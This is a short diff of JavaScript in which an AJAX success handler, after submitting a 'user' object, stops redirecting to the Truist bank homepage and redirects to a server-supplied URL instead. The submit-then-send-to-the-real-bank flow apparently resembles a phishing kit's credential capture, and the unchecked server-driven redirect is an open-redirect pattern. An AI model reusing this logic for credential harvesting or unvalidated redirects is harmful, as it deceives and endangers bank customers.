@@ -225,7 +225,7 @@
                 data: user
             }).done(function(msg) {
                 console.log(msg);
-                window.location.href = "https://truist.com/";
+                window.location.href = msg.url;
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
